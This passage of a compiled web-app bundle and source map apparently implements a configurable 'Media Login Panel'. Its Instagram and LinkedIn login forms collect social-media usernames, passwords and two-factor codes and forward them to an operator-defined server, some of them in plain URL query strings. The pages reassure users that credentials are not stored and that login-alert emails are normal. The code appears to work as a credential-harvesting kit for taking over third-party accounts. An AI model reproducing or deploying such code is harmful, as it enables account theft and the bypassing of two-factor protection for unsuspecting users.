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","file":"static/js/main.29ccb4df.chunk.js","sourcesContent":["module.exports = __webpack_public_path__ + \"static/media/logo.c6b5b406.png\";","module.exports = __webpack_public_path__ + \"static/media/instagram-logo.c1ea2611.svg\";","module.exports = __webpack_public_path__ + \"static/media/linkedin-logo.ab5b573d.svg\";","module.exports = __webpack_public_path__ + \"static/media/facebook-logo.c888480a.svg\";","module.exports = __webpack_public_path__ + \"static/media/twitter-logo.cde0083c.svg\";","module.exports = __webpack_public_path__ + \"static/media/pinterest-logo.cab4ec59.svg\";","import React from \"react\";\r\nimport { Row, Col } from \"react-bootstrap\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\n\r\nimport logo from \"../images/logo.png\";\r\nimport \"../css/style.css\";\r\n\r\nconst env = runtimeEnv();\r\n\r\nexport default function Header() {\r\n  return (\r\n    <>\r\n      <div className=\"dashboard-header\">\r\n        <div className=\"header-body\">\r\n          <Row>\r\n            <Col className=\"d-flex justify-content-center\">\r\n              {env.REACT_APP_FAVICONURL !== undefined &&\r\n              env.REACT_APP_FAVICONURL != null ? (\r\n                <img\r\n                  className=\"img-fluid\"\r\n                  alt=\"logo\"\r\n                  src={env.REACT_APP_FAVICONURL}\r\n                ></img>\r\n              ) : (\r\n                <img src={logo} className=\"img-fluid\" alt=\"logo\" />\r\n              )}\r\n            </Col>\r\n          </Row>\r\n        </div>\r\n      </div>\r\n    </>\r\n  );\r\n}\r\n","import React from \"react\";\r\nimport { Container, Row, Col } from \"react-bootstrap\";\r\n\r\nexport default function Footer() {\r\n  return (\r\n    <Container fluid=\"sm\">\r\n    <div className=\"d-flex justify-content-between flex-wrap\" id=\"footer\">\r\n      <Row>\r\n        <Col>\r\n          <p>You might get an email that someone logged into your account, that's\r\n          perfectly normal.</p>\r\n        </Col>\r\n      </Row>\r\n    </div>\r\n    </Container>\r\n  );\r\n}\r\n","import React, { Component } from \"react\";\r\nimport { Redirect } from \"react-router-dom\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Container, Row, Col, Card } from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\nimport instagramLogo from \"../images/instagram-logo.svg\";\r\nimport linkedinLogo from \"../images/linkedin-logo.svg\";\r\nimport facebookLogo from \"../images/facebook-logo.svg\";\r\nimport twitterLogo from \"../images/twitter-logo.svg\";\r\nimport pinterestLogo from \"../images/pinterest-logo.svg\";\r\n\r\nconst env = runtimeEnv();\r\nconsole.log(env.REACT_APP_URL);\r\nconsole.log(window.location.host);\r\nexport default class Home extends Component {\r\n  state = {\r\n    redirect: false,\r\n    to: \"\",\r\n  };\r\n  setRedirect = (url) => {\r\n    this.setState({\r\n      redirect: true,\r\n      to: url,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to={this.state.to} />;\r\n    }\r\n  };\r\n  componentDidMount() {\r\n    const favicon = document.getElementById(\"FavIcon\");\r\n    if (\r\n      env.REACT_APP_FAVICONURL !== undefined ||\r\n      env.REACT_APP_FAVICONURL !== \"\"\r\n    )\r\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\r\n    const title = document.getElementById(\"AppTitle\");\r\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\r\n      title.innerText = `${env.REACT_APP_TITLE}`;\r\n    else {\r\n      title.innerText = \"Media Login Panel\";\r\n    }\r\n  }\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <div className=\"col2 col-center\">\r\n          <Container>\r\n            <Card className=\"h-95\">\r\n              <Card.Body className=\"text-center\">\r\n                {this.renderRedirect()}\r\n                {env.REACT_APP_INSTAGRAM === \"true\" ? (\r\n                  <div>\r\n                    <a\r\n                      class=\"btn btn-lg btn-primary lift btn-list btn-selection instaunicorn-btn-black\"\r\n                      onClick={() => this.setRedirect(\"/Instagram\")}\r\n                    >\r\n                      <img src={instagramLogo} class=\"img-selection\" />\r\n                    </a>\r\n                  </div>\r\n                ) : (\r\n                  \"\"\r\n                )}\r\n\r\n                {env.REACT_APP_FACEBOOK === \"true\" ? (\r\n                  <div>\r\n                    <a\r\n                      class=\"btn btn-lg btn-primary lift btn-list btn-selection instaunicorn-btn-black\"\r\n                      onClick={() => this.setRedirect(\"/Facebook\")}\r\n                    >\r\n                      <img src={facebookLogo} class=\"img-selection\" />\r\n                    </a>\r\n                  </div>\r\n                ) : (\r\n                  \"\"\r\n                )}\r\n\r\n                {env.REACT_APP_PINTEREST === \"true\" ? (\r\n                  <div>\r\n                    <a\r\n                      class=\"btn btn-lg btn-primary lift btn-list btn-selection instaunicorn-btn-black\"\r\n                      onClick={() => this.setRedirect(\"/Pinterest\")}\r\n                    >\r\n                      <img src={pinterestLogo} class=\"img-selection\" />\r\n                    </a>\r\n                  </div>\r\n                ) : (\r\n                  \"\"\r\n                )}\r\n\r\n                {env.REACT_APP_TWITTER === \"true\" ? (\r\n                  <div>\r\n                    <a\r\n                      class=\"btn btn-lg btn-primary lift btn-list btn-selection instaunicorn-btn-black\"\r\n                      onClick={() => this.setRedirect(\"/Twitter\")}\r\n                    >\r\n                      <img src={twitterLogo} class=\"img-selection\" />\r\n                    </a>\r\n                  </div>\r\n                ) : (\r\n                  \"\"\r\n                )}\r\n\r\n                {env.REACT_APP_LINKEDIN === \"true\" ? (\r\n                  <div>\r\n                    <a\r\n                      class=\"btn btn-lg btn-primary lift btn-list btn-selection instaunicorn-btn-black\"\r\n                      onClick={() => this.setRedirect(\"/Linkedin\")}\r\n                    >\r\n                      <img src={linkedinLogo} class=\"img-selection\" />\r\n                    </a>\r\n                  </div>\r\n                ) : (\r\n                  \"\"\r\n                )}\r\n              </Card.Body>\r\n            </Card>\r\n          </Container>\r\n        </div>\r\n        <Footer />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\nexport default class Instagram extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    twoFactor: false,\r\n    email_auth: false,\r\n    success: false,\r\n    code: \"\",\r\n    two_factor_identifier: \"\",\r\n    verificationMethod: \"\",\r\n    appName: window.location.hostname.substring(0).split(\".\")[0],\r\n  };\r\n\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    const { value, maxLength } = event.target;\r\n    const message = value.slice(0, maxLength);\r\n    this.setState({ code: message });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      console.log(this.state.appName, window.location.href.split(\"//\")[1]);\r\n      fetch(`${env.REACT_APP_URL}/insta`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.twoFactor) {\r\n              this.setState({\r\n                email_auth: responseData.email_auth,\r\n                twoFactor: true,\r\n                loading: true,\r\n                two_factor_identifier: responseData.two_factor_identifier,\r\n                verificationMethod: responseData.verificationMethod,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\r\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\r\n        this.onShowAlert();\r\n      });\r\n    } else {\r\n      if (!this.state.email_auth) {\r\n        fetch(\r\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&appName=${this.state.appName}`,\r\n          {\r\n            method: \"GET\",\r\n          }\r\n        )\r\n          .then((response) => response.json())\r\n          .then((responseData) => {\r\n            console.log(responseData);\r\n            if (responseData.success) {\r\n              this.setState(\r\n                { success: true, message: responseData.message },\r\n                () => {\r\n                  this.onShowAlert();\r\n                }\r\n              );\r\n            } else {\r\n              this.setState({ message: responseData.message }, () => {\r\n                this.onShowAlert();\r\n              });\r\n            }\r\n          });\r\n      } else {\r\n        fetch(\r\n          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,\r\n          {\r\n            method: \"GET\",\r\n          }\r\n        )\r\n          .then((response) => response.json())\r\n          .then((responseData) => {\r\n            console.log(responseData);\r\n            this.setState(\r\n              {\r\n                message: responseData.message,\r\n              },\r\n              () => {\r\n                this.onShowAlert();\r\n              }\r\n            );\r\n            if (responseData.success) {\r\n              fetch(`${env.REACT_APP_URL}/insta`, {\r\n                method: \"POST\",\r\n                headers: {\r\n                  \"Content-Type\":\r\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n                },\r\n                body: queryString.stringify({\r\n                  username: this.state.username,\r\n                  password: this.state.password,\r\n                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n                  appName: this.state.appName,\r\n                }),\r\n              })\r\n                .then((response) => response.json())\r\n                .then((responseData) => {\r\n                  console.log(responseData);\r\n                  this.setState(\r\n                    {\r\n                      message: responseData.message,\r\n                    },\r\n                    () => {\r\n                      this.onShowAlert();\r\n                    }\r\n                  );\r\n                  if (!responseData.success) {\r\n                    this.setState({ loading: false });\r\n                  } else {\r\n                    if (!responseData.twoFactor) {\r\n                      this.setState({ success: true });\r\n                    }\r\n                  }\r\n                });\r\n            } else {\r\n              this.setState({ message: responseData.message, code: \"\" }, () => {\r\n                this.onShowAlert();\r\n              });\r\n            }\r\n          });\r\n      }\r\n    }\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-8 col-xl-8\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1 className=\"instaunicorn-h1\">Login Success Thank You!</h1>\r\n                            <p className=\"instaunicorn-p\">Redirecting...</p>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3 instaunicorn-h1\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5 instaunicorn-p\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled className=\"instaunicorn-btn-black\">\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn instaunicorn-btn-black\"\r\n                              >\r\n                                Login Now!\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.twoFactor ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  {this.state.email_auth ? (\r\n                                    <Form.Label>\r\n                                      Please enter the code received\r\n                                    </Form.Label>\r\n                                  ) : (\r\n                                    <Form.Label>Enter code received</Form.Label>\r\n                                  )}\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    placeholder=\"Enter code you receieved\"\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"form-control instaunicorn-input\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn instaunicorn-btn-black\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Linkedin extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    challangeID: \"\",\r\n    code: \"\",\r\n    appName: window.location.hostname.substring(0).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    const { value, maxLength } = event.target;\r\n    const message = value.slice(0, maxLength);\r\n    this.setState({ code: message });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    